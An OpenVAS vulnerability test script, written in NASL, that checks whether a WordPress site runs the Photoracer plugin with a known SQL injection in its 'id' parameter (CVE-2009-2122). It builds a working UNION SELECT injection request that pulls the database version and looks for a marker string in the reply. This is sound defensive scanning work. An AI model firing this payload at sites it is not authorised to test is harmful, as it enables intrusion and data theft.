###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_photoracer_plugin_id_sql_inj_vuln.nasl 7024 2017-08-30 11:51:43Z teissa $
#
# WordPress Photoracer Plugin 'id' Parameter SQL Injection Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to perform SQL Injection
attack and gain sensitive information.

Impact Level: Application";

tag_affected = "WordPress Photoracer plugin version 1.0";

tag_insight = "The flaw is due to improper validation of user-supplied input
passed via the 'id' parameter to '/wp-content/plugins/photoracer/viewimg.php',
which allows attackers to manipulate SQL queries by injecting arbitrary SQL code.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is installed with WordPress Photoracer plugin and
is prone to sql injection vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.901204";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 7024 $");
  script_tag(name:"last_modification", value:"$Date: 2017-08-30 13:51:43 +0200 (Wed, 30 Aug 2017) $");
  script_tag(name:"creation_date", value:"2011-08-29 16:22:41 +0200 (Mon, 29 Aug 2011)");
  script_bugtraq_id(35382);
  script_cve_id("CVE-2009-2122");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress Photoracer Plugin 'id' Parameter SQL Injection Vulnerability");


  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/35450");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/51152");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17720");
  script_xref(name : "URL" , value : "http://wordpress.org/extend/plugins/photoracer");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Construct the Attack Request
url = dir + "/wp-content/plugins/photoracer/viewimg.php?id=-1%20UNION%20" +
            "SELECT%200,1,2,3,4,CONCAT(0x6f762d73716c2d696e6a2d74657374," +
            "0x3a,@@version,0x3a,0x6f762d73716c2d696e6a2d74657374),6,7,8";

## Try attack and check the response to confirm vulnerability.
if(http_vuln_check(port:port, url:url, pattern:">ov-sql-inj-test:[0-9]+.*:" +
                                                        "ov-sql-inj-test<")){
  security_message(port);
}
